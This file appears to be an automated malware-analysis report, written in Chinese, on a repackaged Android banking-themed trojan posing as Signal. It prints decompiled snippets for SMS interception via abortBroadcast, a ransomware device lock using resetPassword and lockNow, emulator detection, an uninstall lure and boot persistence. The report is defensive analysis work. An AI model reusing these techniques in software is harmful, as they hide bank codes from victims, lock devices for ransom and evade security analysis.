@@ -1,0 +1,217 @@
+{
+  "APK信息": {
+    "文件名": "84736ec89cf619c7d9d9b2df4d7da3247919de12fce51d6f3dcd30a89e1c2d96.apk",
+    "sha256": "84736ec89cf619c7d9d9b2df4d7da3247919de12fce51d6f3dcd30a89e1c2d96",
+    "包名": "org.thoughtcrime.securesms",
+    "应用名": "Raiffeisen SmsSecurity",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 1233.2
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\by;",
+          "method_signature": "onReceive(Context context, Intent intent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "@Override // android.content.BroadcastReceiver\npublic void onReceive(Context context, Intent intent) {\n    abortBroadcast();\n}",
+          "malicious_code_snippet_context": "          this(databaseMigrationActivity);\n      }\n  \n>>>     @Override // android.content.BroadcastReceiver\n>>>     public void onReceive(Context context, Intent intent) {\n>>>         abortBroadcast();\n>>>     }\n  }",
+          "behavior_description": "该类是 org.thoughtcrime.securesms 包下的一个 BroadcastReceiver 内部类，其 onReceive 回调中无条件调用 abortBroadcast()，不做任何条件判断即终止有序广播的继续传播。当该接收器以高优先级注册监听系统短信到达广播（android.provider.Telephony.SMS_RECEIVED）时，数据流向为：系统短信广播 Intent（source）→ abortBroadcast()（sink），短信广播被截获后立即被终止，导致优先级较低的后续接收器（系统短信通知、默认短信应用、其他应用）全部无法收到该短信，实现短信拦截与隐藏。在已确认恶意的样本中，该手法典型用于隐藏银行验证码/支付确认短信、隐藏恶意扣费订阅确认短信，使用户无法察觉资费损耗或账户异常，为短信欺诈提供直接支撑。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow",
+              "resetPassword"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\h\\f;",
+          "method_signature": "if(this.c != \"0\")",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (this.c != \"0\") {\n    DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService(\"device_policy\");\n    devicePolicyManager.resetPassword(this.c, 1);\n    devicePolicyManager.lockNow();\n}",
+          "malicious_code_snippet_context": "                  if (this.c == \"0\" && strA.length() > 0) {\n                      this.c = strA;\n                  }\n>>>                 if (this.c != \"0\") {\n>>>                     i.b(\"sms_phone\", this.c, context);\n>>>                     i.b(\"RTB\", 2, context);\n>>>                     i.d(this.c, \"Service Started\", context);\n>>>                 }\n                  break;\n              case STARTB:\n                  i.b(\"RTB\", 1, context);",
+          "behavior_description": "该代码伪装在 Signal 开源库包名（org.thoughtcrime.securesms）下，实现典型的勒索软件设备锁屏逻辑。当收到 LOCK 指令且密码值 this.c 不为 \"0\" 时，代码通过 DevicePolicyManager 将设备密码重置为攻击者指定的值（this.c，通常来自远程 C2 下发的指令参数），随后调用 lockNow() 立即锁屏，使用户无法正常使用设备，必须知道攻击者设置的密码才能解锁，以此勒索用户。UNLOCK 分支中攻击者还可远程将密码重置为空实现解锁，进一步证明该密码由攻击者远程控制，属于勒索行为而非正常设备管理功能。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "anti_detection",
+      "中文名": "反检测/对抗技术",
+      "MITRE": "T1426",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "anti_emulator",
+          "中文名": "反模拟器",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "goldfish",
+              "generic_x86"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\h\\i;",
+          "method_signature": "if(Build.HARDWARE.equals(\"goldfish\")",
+          "malicious_behavior": "anti_detection",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.BRAND.equals(\"generic\") || Build.BRAND.equals(\"generic_x86\")) { i++; }\nif (Build.DEVICE.equals(\"generic\") || Build.DEVICE.equals(\"vbox86p\")) { i++; }\nif (Build.MODEL.equals(\"sdk\") || Build.MODEL.equals(\"google_sdk\") || Build.MODEL.equals(\"Android SDK built for x86\")) { i++; }\nif (Build.HARDWARE.equals(\"goldfish\") || Build.HARDWARE.equals(\"vbox86\")) { i++; }\nif (Build.FINGERPRINT.contains(\"generic/google_sdk/generic\") || Build.FINGERPRINT.contains(\"generic/vbox86p/vbox86p\")) { i2 = i + 1; }\nTelephonyManager tm = (TelephonyManager) context.getSystemService(\"phone\");\nif (tm.getSimState() == 5 && (tm.getSimOperatorName().equals(\"Android\") || tm.getNetworkOperatorName().equals(\"AT&T\"))) { i2++; }",
+          "malicious_code_snippet_context": "              if (Build.MANUFACTURER.equals(\"unknown\") || Build.MANUFACTURER.equals(\"Genymotion\")) {\n                  i++;\n              }\n>>>             if (Build.BRAND.equals(\"generic\") || Build.BRAND.equals(\"Android\") || Build.BRAND.equals(\"google\") || Build.BRAND.equals(\"generic_x86\")) {\n>>>                 i++;\n>>>             }\n>>>             if (Build.DEVICE.equals(\"generic\") || Build.DEVICE.equals(\"generic_x86\") || Build.DEVICE.equals(\"vbox86p\")) {\n>>>                 i++;\n>>>             }\n>>>             if (Build.MODEL.equals(\"sdk\") || Build.MODEL.equals(\"google_sdk\") || Build.MODEL.equals(\"generic\") || Build.MODEL.equals(\"Full Android on x86\") || Build.MODEL.equals(\"Android SDK built for x86\")) {\n                  i++;\n              }\n              if (Build.HARDWARE.equals(\"goldfish\") || Build.HARDWARE.equals(\"vbox86\")) {",
+          "behavior_description": "该代码位于伪装成Signal通讯软件（org.thoughtcrime.securesms）的混淆注入类h/i中，是一套完整的模拟器/沙箱检测例程。数据流向为：读取设备系统属性（Build.BRAND/DEVICE/MODEL/HARDWARE/FINGERPRINT）和电话服务信息（TelephonyManager的SIM状态、SIM/网络运营商名称、SIM国家码）→ 与已知模拟器特征（goldfish、vbox86、vbox86p、generic、google_sdk、Android SDK built for x86、运营商'Android'/'AT&T'等）逐项字符串比对 → 每命中一项将计数器i/i2累加 → 通过计数阈值综合判定应用是否运行在模拟器分析环境中，进而改变程序行为以规避动态分析和安全检测。该行为本身不直接窃取用户数据或造成损失，但作为已确认恶意样本的反检测模块，用于在沙箱/分析环境中隐藏真实恶意载荷，为恶意行为逃避检测提供掩护。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.DELETE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\xpack\\ActUpdate;",
+          "method_signature": "doUpdate(View view)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "startActivity(new Intent(\"android.intent.action.DELETE\", Uri.fromParts(\"package\", \"org.thoughtcrime.securesms\", null)));",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public class ActUpdate extends Activity {\n      public void doUpdate(View view) {\n>>>         startActivity(new Intent(\"android.intent.action.DELETE\", Uri.fromParts(\"package\", \"org.thoughtcrime.securesms\", null)));\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "该方法伪装成'更新'操作（doUpdate），实际使用硬编码的正版Signal应用包名 org.thoughtcrime.securesms 构造 ACTION_DELETE 卸载Intent，并通过startActivity启动系统卸载界面，诱导用户卸载合法的原版Signal安全通讯应用，使重打包的木马版本（xpack）完全接管用户通讯渠道。数据流向：硬编码包名\"org.thoughtcrime.securesms\" → Uri.fromParts构造package URI → ACTION_DELETE Intent → startActivity触发对原版应用的卸载流程。虽然会弹出系统确认框（非完全静默），但借助'更新'按钮的伪装诱导用户确认，属于典型的重打包木马替换原应用手法。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_reboot",
+      "中文名": "设备重启",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "reboot"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thoughtcrime\\securesms\\xbroadcast\\OnBootReceiver;",
+          "method_signature": "if(i.h(context)",
+          "malicious_behavior": "device_reboot",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public void onReceive(Context context, Intent intent) {\n    if (i.h(context)) {\n        return;\n    }\n    context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", \"value\"));\n}",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public class OnBootReceiver extends BroadcastReceiver {\n      @Override // android.content.BroadcastReceiver\n>>>     public void onReceive(Context context, Intent intent) {\n>>>         if (i.h(context)) {\n>>>             return;\n>>>         }\n>>>         i.c(\"REBOOT\", \"Device reboot fixed. Service started after reboot.\", context);\n>>>         context.startService(new Intent(\"XMainProcessStart\").putExtra(\"name\", \"value\"));\n      }\n  }",
+          "behavior_description": "该类是伪装在 Signal (org.thoughtcrime.securesms) 包名下的注入组件 OnBootReceiver，监听系统开机完成广播。设备重启后 onReceive() 被系统回调触发，先通过 i.h(context) 检查运行条件（如服务是否存活），随后调用 startService() 启动名为 XMainProcessStart 的恶意主进程服务，实现恶意软件开机自启与持久化保活，确保恶意载荷在设备重启后仍能持续运行。数据流向：系统开机广播(ACTION_BOOT_COMPLETED) → BroadcastReceiver.onReceive() → startService() 重启恶意主进程服务。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
